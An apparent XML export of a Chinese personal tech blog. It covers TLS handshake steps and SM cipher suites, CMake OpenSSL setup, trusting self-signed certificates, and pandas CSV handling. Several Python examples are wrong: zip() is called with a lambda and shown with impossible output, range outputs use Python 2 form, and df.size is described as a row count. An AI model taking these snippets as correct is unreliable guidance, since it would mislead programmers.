y="1122.0669">&#26381;&#21153;&#31471;&#20351;&#29992;&#35777;&#20070;&#31169;&#38053;&#23545;&#35777;&#20070;&#21069;&#30340;&#25152;&#26377;&#25569;&#25163;&#25968;&#25454;&#25688;&#35201;&#21518;&#36827;&#34892;&#31614;&#21517;&#65292;&#35777;&#26126;&#35777;&#20070;&#26159;&#33258;&#24049;&#25345;&#26377;&#30340;&#65292;&#23458;&#25143;&#31471;&#20250;&#20351;&#29992;&#20844;&#38053;&#36827;&#34892;&#39564;&#35777;</text><path d="M1000,1140.1328 L1000,1240.1328 L1244,1240.1328 L1244,1150.1328 L1234,1140.1328 L1000,1140.1328 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1234,1140.1328 L1234,1150.1328 L1244,1150.1328 L1234,1140.1328 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="52" x="1006" y="1157.1997">Finished</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="1006" y="1172.3325">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="1006" y="1187.4653">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="1006" y="1202.5981">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="192" x="1006" y="1217.731">Handshake Type: Finished(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="100" x="1006" y="1232.8638">server hello&#32467;&#26463;</text><polygon fill="#181818" points="1110.5,1263.0625,1120.5,1267.0625,1110.5,1271.0625,1114.5,1267.0625" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="362.5" x2="1116.5" y1="1267.0625" y2="1267.0625"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="384" x="369.5" y="1261.9966">Change Chipher Spec, Certificate, Certificate Verify, Finished</text><path d="M223,1280.0625 L223,1335.0625 L501,1335.0625 L501,1290.0625 L491,1280.0625 L223,1280.0625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M491,1280.0625 L491,1290.0625 L501,1290.0625 L491,1280.0625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138" x="229" y="1297.1294">Change Chipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="229" y="1312.2622">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="229" y="1327.395">&#21578;&#30693;&#26381;&#21153;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M240,1345.4609 L240,1476.4609 L484,1476.4609 L484,1355.4609 L474,1345.4609 L240,1345.4609 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M474,1345.4609 L474,1355.4609 L484,1355.4609 L474,1345.4609 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="246" y="1362.5278">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="246" y="1377.6606">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="246" y="1392.7935">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="246" y="1407.9263">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="246" y="1423.0591">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="246" y="1438.1919">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="246" y="1453.3247">&#25552;&#20132;&#23458;&#25143;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="156" x="246" y="1468.4575">&#21253;&#21547;&#20027;&#39064;&#12289;&#20844;&#38053;&#12289;&#31614;&#21517;&#31639;&#27861;</text><path d="M5,1486.5234 L5,1586.5234 L721,1586.5234 L721,1496.5234 L711,1486.5234 L5,1486.5234 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M711,1486.5234 L711,1496.5234 L721,1496.5234 L711,1486.5234 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="105" x="11" y="1503.5903">Certificate Verify</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="11" y="1518.7231">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="27" y="1533.856">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="11" y="1548.9888">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="245" x="27" y="1564.1216">Handshake Type: Certificate Verify(15)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="663" x="43" y="1579.2544">&#23458;&#25143;&#31471;&#20351;&#29992;&#35777;&#20070;&#31169;&#38053;&#23545;&#35777;&#20070;&#21069;&#30340;&#25152;&#26377;&#25569;&#25163;&#25968;&#25454;&#25688;&#35201;&#21518;&#36827;&#34892;&#31614;&#21517;&#65292;&#35777;&#26126;&#35777;&#20070;&#26159;&#33258;&#24049;&#25345;&#26377;&#30340;&#65292;&#26381;&#21153;&#31471;&#20250;&#20351;&#29992;&#20844;&#38053;&#36827;&#34892;&#39564;&#35777;</text><path d="M240,1597.3203 L240,1697.3203 L484,1697.3203 L484,1607.3203 L474,1597.3203 L240,1597.3203 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M474,1597.3203 L474,1607.3203 L484,1607.3203 L474,1597.3203 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="52" x="246" y="1614.3872">Finished</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="246" y="1629.52">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="246" y="1644.6528">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="246" y="1659.7856">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="192" x="246" y="1674.9185">Handshake Type: Finished(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="100" x="246" y="1690.0513">server hello&#32467;&#26463;</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1485" x="0" y="1723.6836"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1485" y1="1723.6836" y2="1723.6836"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1485" y1="1726.6836" y2="1726.6836"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="117" x="684" y="1713.1172"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="98" x="690" y="1729.1841">&#24320;&#22987;ssl&#25968;&#25454;&#20256;&#36755;</text><!--SRC=[pLTTJnfP6BxdLvpB8R5TmJNPaDZ4O7VTfBlRL7Tl2GjJcOZ3B3CsUYTDxOA0OAqBAbgnYguVeEck8c3zCJldp73Llx3lcJCCOx56D6dqHkRCUP_tupplyvwH_55520YINrHG82pmekAGR4io7tt1HnsEWG4aos6IAP94ifa_8UL_qS20my4i7ZnYspp8QpoZOJuSZZZ4YCAZ2AotWDa_53BUUYEYGfz6foNUWuRzOb0E-STvpkrsEgmdywqTbdCv7GZznaTb8IAYqISZoFNGZRZUgTw-tZudqfVFjLSd95zHmZAymENrvlAiNeffXIJEpZVNDhMLL_Aa94MY2X_qlM0mCY1gvHpvi8ItSshzHBqeabW5UGKf1D6FJ0eAJxVGFvoQnTbzN7dTVBEjrhP8UfCP_ZSJqslxQlrSBs_fbPYrY2jdsiuHdji04skHuPE5F0tCM0Jqvag656fawGWzW_GZ4os7YJHUNLMhU_Wmfy-zLAkr7tuQHR-AmXJ9dJHp_tngfF3cEcxKJFkP7J24vCdR2ad585ij4IU50_Hu2ifj9Ej1dGNWlksZPTKhf-Ju9HYHGXhF5N4stRRpc6JmYVu9dkkbsxN3Zx05ByPnDMNMBvxJYxkNZ8GnqQzCHdcVFpmMYGfAQ4BcN8OtUnNj9kFyj0-EFyfp_SPX6sN8B3IXckLD4Z_LzYjuzW1CFyCWkqNSoDYH97dSHz7ugK38Buxnleb8a8Ta-vqENWmYob27WwNru16ZfmUD6C-CRJt8QnXQN93uG0zwB0QYqnBKprPLsCb3tpmN0dwW_JF-ZqbULYujNju131QUJ_UWxmLHa4DyqDOkPjFPu-YgNUo6d9jLy0likYM_458RAtfbJGY2Czden1-7B4ZjxQvQcyTRQVh3s4T1hAEhbjJQQtnqp3RGLzaIZY_32ldh2DTh1evMBEFoYhqfBxMZiQSR_hGOn8XjPv2zMxfe5HDqTHtIi78ZXrjGHb17o4gjluTMOC266FKnU7nsqfn9aEJVR15sCgbIgsae5WC4799SnCTBRPfsqAEJc9-Hf7C3vuQsnGjpshjjAsGQQJN9X17eGT9b42McLt1Cr_Y_gWaSlqX-8BuPmA0aXIdPAJs6_8gVSqFbc3CGQ7tdFVW0KROSTqNoAznptr7u6Jr-eDMNAMg-0jvW1HkQXjCPlLpMZkjuFKbPLtev-EJfC7eQZIYHG2JiGI55aRvnFNHTL_JE7hzZpXsphjC3ClKIzBaK0trkqosJ1VR3k57FIiOvqjp1ZJWcY5FDsRHsNbQhXxWnWxCLsdCmY_OhR3lPA3RtKWReI4kXeU9o20rQCeqWUDHMRITgpnGc_6zI8R2m9XX2GuAi2EBOfA5ew6SO538DlX_zFWqZr8cyWzfg5Sz-O0EG7a9cZu42uxs3K2VeKeflx6AHtkmqxiey6r9NDvEs7UTo6JuW0qjap0pOfK6jrfkRUNedCAG7Vh0oclMx6UdOsBX1jeP8txBNgErrl6H1SAx-jX1QAQld5w3gB75j9mQ90ktO8umQwZynGme9TfLaiR2B44IdNwpgnHIh2f03h4X-tkGh9F7d7Zuzfbmf9037FbD0E9bVLbg60_m6sslgQetUhwTQBPU64hCms7rOgo-IjNUsMqd7rTfKyv3z8dARsuLv6Ry2xmlp8tJb0B4ElFi1qehWtdKlqrEBLNVitiuqxsttjXlfAtPlMpAwwrwphlUwU-5xcOxTdIJzQZOSgOqD_UCY_Mh-7m00]--></g></svg>

<h1 id="五、国密相关"><a href="#五、国密相关" class="headerlink" title="五、国密相关"></a>五、国密相关</h1><h2 id="1-知识扫盲"><a href="#1-知识扫盲" class="headerlink" title="1. 知识扫盲"></a>1. 知识扫盲</h2><h3 id="1-1-算法"><a href="#1-1-算法" class="headerlink" title="1.1. 算法"></a>1.1. 算法</h3><ul>
<li>sm1: 对称加密算法，本身闭源，需要使用ukey硬件中的接口实现</li>
<li>sm2: 非对称加密算法，本身基于ecc椭圆算法实现，可以使用软件进行实现</li>
<li>sm3: 摘要算法</li>
<li>sm4: 对称加密算法，可以使用软件实现</li>
</ul>
<h3 id="1-2-算法套件"><a href="#1-2-算法套件" class="headerlink" title="1.2. 算法套件"></a>1.2. 算法套件</h3><h4 id="ECC-SM4-SM3"><a href="#ECC-SM4-SM3" class="headerlink" title="ECC-SM4-SM3"></a>ECC-SM4-SM3</h4><p>算法可以类比<code>TLS_RSA_WITH_AES_256_GCM_SHA384</code>，其中</p>
<ul>
<li>ECC对应RSA，密钥交换算法，由客户端生成预主密钥，使用ECC椭圆算法用服务端公钥加密</li>
<li>SM4对应<code>AES_256_GCM</code>，对称加密算法，为握手完成后的数据传输阶段的算法</li>
<li>SM3对应<code>SHA384</code>，摘要算法</li>
</ul>
<h4 id="ECC-SM1-SM3"><a href="#ECC-SM1-SM3" class="headerlink" title="ECC-SM1-SM3"></a>ECC-SM1-SM3</h4><p>仅将SM4换成SM1的闭源实现，其他都一样</p>
<h1 id="六、工程开发"><a href="#六、工程开发" class="headerlink" title="六、工程开发"></a>六、工程开发</h1><h2 id="1-cmake"><a href="#1-cmake" class="headerlink" title="1. cmake"></a>1. cmake</h2><h3 id="1-1-引入cmake使用"><a href="#1-1-引入cmake使用" class="headerlink" title="1.1. 引入cmake使用"></a>1.1. 引入cmake使用</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置find之后，下面几个变量会进行赋值，引入到library和include里面即可</span></span><br><span class="line"><span class="keyword">find_package</span>(OpenSSL REQUIRED)</span><br><span class="line"></span><br><span class="line"><span class="keyword">message</span>(<span class="string">&quot;$&#123;OPENSSL_INCLUDE_DIR&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">message</span>(<span class="string">&quot;$&#123;OPENSSL_SSL_LIBRARY&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">message</span>(<span class="string">&quot;$&#123;OPENSSL_CRYPTO_LIBRARY&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">message</span>(<span class="string">&quot;$&#123;OPENSSL_LIBRARIES&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="1-2-系统安装了多个openssl版本，如何指定版本"><a href="#1-2-系统安装了多个openssl版本，如何指定版本" class="headerlink" title="1.2. 系统安装了多个openssl版本，如何指定版本"></a>1.2. 系统安装了多个openssl版本，如何指定版本</h3><ul>
<li>在cmakecache里面指定一下下面几个值，重新生成一下就好了</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">OPENSSL_CRYPTO_LIBRARY:FILEPATH=/usr/lib/openssl-<span class="number">1.1</span>/libcrypto.so</span><br><span class="line"></span><br><span class="line">//Path to a <span class="keyword">file</span>.</span><br><span class="line">OPENSSL_INCLUDE_DIR:PATH=/usr/<span class="keyword">include</span>/openssl-<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">OPENSSL_LIBRARIES:UNINITIALIZED=/usr/lib/openssl-<span class="number">1.1</span>/libssl.so;/usr/lib/openssl-<span class="number">1.1</span>/libcrypto.so</span><br><span class="line"></span><br><span class="line">//Path to a library.</span><br><span class="line">OPENSSL_SSL_LIBRARY:FILEPATH=/usr/lib/openssl-<span class="number">1.1</span>/libssl.so</span><br></pre></td></tr></table></figure>

<h2 id="2-编译-1"><a href="#2-编译-1" class="headerlink" title="2. 编译"></a>2. 编译</h2><h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-使用openssl命令模拟https请求"><a href="#1-使用openssl命令模拟https请求" class="headerlink" title="1. 使用openssl命令模拟https请求"></a>1. 使用openssl命令模拟https请求</h2><ul>
<li>https就是在ssl握手的基础上，发送http请求</li>
<li>http请求的原生格式如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /xxx/aaa/ddd HTTP/1.1</span><br><span class="line">Host: 172.22.230.48</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;appName&quot;:&quot;test&quot;,&quot;containerName&quot;: &quot;1&quot;,&quot;model&quot;:&quot;aa&quot;,&quot;certSN&quot;:&quot;12345&quot;,&quot;path&quot;:&quot;c:\\asdf&quot;,&quot;username&quot;:&quot;asdf&quot;,&quot;issuer&quot;:&quot;asdf&quot;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>当openssl连接上服务端的端口后，将上述文本复制到命令行，回车即可发送请求</li>
<li>注: content-length是要求和正文内容长度一致，需要注意换行所占字节数</li>
</ul>
<h2 id="2-让浏览器信任自己颁发的证书"><a href="#2-让浏览器信任自己颁发的证书" class="headerlink" title="2. 让浏览器信任自己颁发的证书"></a>2. 让浏览器信任自己颁发的证书</h2><h3 id="1-windows"><a href="#1-windows" class="headerlink" title="1) windows"></a>1) windows</h3><ul>
<li>只需要将CA导入到ie的受信任的根证书颁发机构就好了</li>
</ul>
<h3 id="2-linux"><a href="#2-linux" class="headerlink" title="2) linux"></a>2) linux</h3><h4 id="archlinux"><a href="#archlinux" class="headerlink" title="archlinux"></a>archlinux</h4><p><a href="/blogs/2021-04-02-archlinux/#4-%E4%BF%A1%E4%BB%BBCA%E8%AF%81%E4%B9%A6">信任CA证书</a></p>
<h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><p><a href="/blogs/2018-07-27-ubuntuStudy/#2-%E4%BF%A1%E4%BB%BBCA%E8%AF%81%E4%B9%A6">信任CA证书</a></p>
<h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><h4 id="1-自己颁发的证书，chrome导入了ca还是不授信"><a href="#1-自己颁发的证书，chrome导入了ca还是不授信" class="headerlink" title="(1) 自己颁发的证书，chrome导入了ca还是不授信"></a>(1) <font color="red">自己颁发的证书，chrome导入了ca还是不授信</font></h4><ul>
<li>新版chrome加了一个安全选项，需要存在SAN（Subject Alternative Name）字段才可以授信</li>
<li>操作具体见 <a href="#3-%E7%94%9F%E6%88%90%E5%B8%A6%E6%8B%93%E5%B1%95%E5%AD%97%E6%AE%B5%E7%9A%84%E8%AF%81%E4%B9%A6">生成带拓展字段的证书</a></li>
<li>格式类似下面</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">        X509v3 extensions:</span><br><span class="line">            ...</span><br><span class="line">            X509v3 Subject Alternative Name:</span><br><span class="line">                DNS:www.abcdtest.com</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>DNS字段需要和访问的域名对应才行</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>数据处理笔记（python）</title>
    <url>/blogs/2018-10-25-dataScienceStudyPython/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python 3.8.0</span><br></pre></td></tr></table></figure>

<h1 id="一、内建函数"><a href="#一、内建函数" class="headerlink" title="一、内建函数"></a>一、内建函数</h1><h2 id="range-列表"><a href="#range-列表" class="headerlink" title="range 列表"></a>range 列表</h2><p>创建一个整数列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">range</span>(<span class="number">10</span>)        <span class="comment"># 从 0 开始到 10</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)     <span class="comment"># 从 1 开始到 11</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>, <span class="number">5</span>)  <span class="comment"># 步长为 5</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">25</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">3</span>)  <span class="comment"># 步长为 3</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">range</span>(<span class="number">0</span>, -<span class="number">10</span>, -<span class="number">1</span>) <span class="comment"># 负数</span></span><br><span class="line">[<span class="number">0</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">3</span>, -<span class="number">4</span>, -<span class="number">5</span>, -<span class="number">6</span>, -<span class="number">7</span>, -<span class="number">8</span>, -<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">range</span>(<span class="number">0</span>)</span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<h2 id="list操作"><a href="#list操作" class="headerlink" title="list操作"></a>list操作</h2><p>判断某个值是否在list中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_list = <span class="built_in">list</span>(xxxx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> test_list)  <span class="comment"># 返回true和false</span></span><br></pre></td></tr></table></figure>

<h2 id="filter过滤器"><a href="#filter过滤器" class="headerlink" title="filter过滤器"></a>filter过滤器</h2><p>删除list中空值和nan</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3中filter返回迭代器，需要使用list()转化回list</span></span><br><span class="line">test_list = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> s: s <span class="keyword">and</span> s.strip(), test_list))</span><br></pre></td></tr></table></figure>

<h2 id="map向量对应计算"><a href="#map向量对应计算" class="headerlink" title="map向量对应计算"></a>map向量对应计算</h2><ul>
<li>两个同样长度的向量，每个元素按照function计算</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">b = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line">result = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x + y, a, b)</span><br><span class="line"><span class="comment"># 输出是map对象，好像不会直接出结果，访问时计算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result))  <span class="comment"># [5, 7, 9, 11]</span></span><br></pre></td></tr></table></figure>

<h2 id="zip向量对应打包"><a href="#zip向量对应打包" class="headerlink" title="zip向量对应打包"></a>zip向量对应打包</h2><ul>
<li>两个同样长度的向量，每个元素打包到一起</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">b = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line">result = <span class="built_in">zip</span>(<span class="keyword">lambda</span> x, y: x + y, a, b)</span><br><span class="line"><span class="comment"># 输出是zip对象，转list打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result))  <span class="comment"># [[1, 4], [2, 5], [3, 6], [4, 7]]</span></span><br></pre></td></tr></table></figure>

<h1 id="二、第三方module"><a href="#二、第三方module" class="headerlink" title="二、第三方module"></a>二、第三方module</h1><h2 id="1-pandas"><a href="#1-pandas" class="headerlink" title="1. pandas"></a>1. pandas</h2><h3 id="1-1-csv文件读写"><a href="#1-1-csv文件读写" class="headerlink" title="1.1. csv文件读写"></a>1.1. csv文件读写</h3><h4 id="1-read-csv-读取csv文件"><a href="#1-read-csv-读取csv文件" class="headerlink" title="1) read_csv 读取csv文件"></a>1) read_csv 读取csv文件</h4><p>直接读取，第一行为表头</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_df = pd.read_csv(<span class="string">&#x27;test.csv&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(test_df.head())</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   Unnamed: 0                                 domain  label</span><br><span class="line">0           0  47faeb4f1b75a48499ba14e9b1cd895a.info      1</span><br><span class="line">1           1   9b86bb2ef4bad69cca0110076215e1f4.org      1</span><br><span class="line">2           2   b1bc086df017d40a4123488866a265b2.org      1</span><br><span class="line">3           3   42f2f603dbf06493ca5a16e1b968d30c.org      1</span><br><span class="line">4           4   381ed097870ca065ba2ee82a9a6aba48.org      1</span><br></pre></td></tr></table></figure>

<p>将第一列作为索引读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_df = pd.read_csv(<span class="string">&#x27;test.csv&#x27;</span>, index_col=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(test_df.head())</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                  domain  label</span><br><span class="line">0  47faeb4f1b75a48499ba14e9b1cd895a.info      1</span><br><span class="line">1   9b86bb2ef4bad69cca0110076215e1f4.org      1</span><br><span class="line">2   b1bc086df017d40a4123488866a265b2.org      1</span><br><span class="line">3   42f2f603dbf06493ca5a16e1b968d30c.org      1</span><br><span class="line">4   381ed097870ca065ba2ee82a9a6aba48.org      1</span><br></pre></td></tr></table></figure>

<p>首行也是数据，自己加表头</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_df = pd.read_csv(<span class="string">&#x27;test1.csv&#x27;</span>, header=<span class="literal">None</span>, index_col=<span class="number">0</span>, names=[<span class="string">&#x27;domain&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(test_df.head())</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                   domain</span><br><span class="line">0               bt12ws.cn</span><br><span class="line">1  rfecpubrggvglbzles.org</span><br><span class="line">2       lhppebosymhd.info</span><br><span class="line">3           ifivdvusa.com</span><br><span class="line">4                 vawi.be</span><br></pre></td></tr></table></figure>

<h4 id="2-to-csv-写csv文件"><a href="#2-to-csv-写csv文件" class="headerlink" title="2) to_csv 写csv文件"></a>2) to_csv 写csv文件</h4><p>默认写入，索引会写到第一列，列名会写到第一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_df.to_csv(<span class="string">&#x27;xxx.csv&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>索引从1开始写到第一列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重建索引，防止其中顺序乱掉，重建的索引从0开始</span></span><br><span class="line">test_df.reset_index(drop=<span class="literal">True</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 所有索引加一，也就是从1开始</span></span><br><span class="line">test_df.index += <span class="number">1</span></span><br><span class="line">test_df.to_csv(<span class="string">&#x27;xxx.csv&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>去除索引，去除表头行写入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_df.to_csv(<span class="string">&#x27;xxx.csv&#x27;</span>, index=<span class="literal">False</span>, header=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>只写其中一列，保留索引，去除表头</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_df[<span class="string">&#x27;label&#x27;</span>].to_csv(<span class="string">&#x27;xxx.csv&#x27;</span>, header=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h3 id="1-2-dataframe相关操作"><a href="#1-2-dataframe相关操作" class="headerlink" title="1.2. dataframe相关操作"></a>1.2. dataframe相关操作</h3><ul>
<li>dataframe本质上多个相同索引的series组成的数据结构</li>
<li>一般df会改变数据的方法都有一个参数inplace，为True的时候改变原数据，为False的时候不改变原数据</li>
</ul>
<h4 id="1-查看信息"><a href="#1-查看信息" class="headerlink" title="1) 查看信息"></a>1) 查看信息</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(xxxxx)</span><br><span class="line">df.describe()       <span class="comment"># 显示数据的各种统计数据包（中位数、平均数、标准差、最值等）</span></span><br><span class="line">df.shape            <span class="comment"># 行列数，注意这里没有括号，shape不是一个函数</span></span><br><span class="line">df.size             <span class="comment"># 行数，同样不是一个函数</span></span><br><span class="line">isnull_df = df.isnull()     <span class="comment"># 得到一个同纬度的true和false组成的dataframe</span></span><br><span class="line">isNull_df.<span class="built_in">any</span>()             <span class="comment"># 显示各列的情况是否含有true，相当于各列取或</span></span><br></pre></td></tr></table></figure>

<h4 id="2-初始化"><a href="#2-初始化" class="headerlink" title="2) 初始化"></a>2) 初始化</h4><p>空dataframe初始化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame()</span><br></pre></td></tr></table></figure>

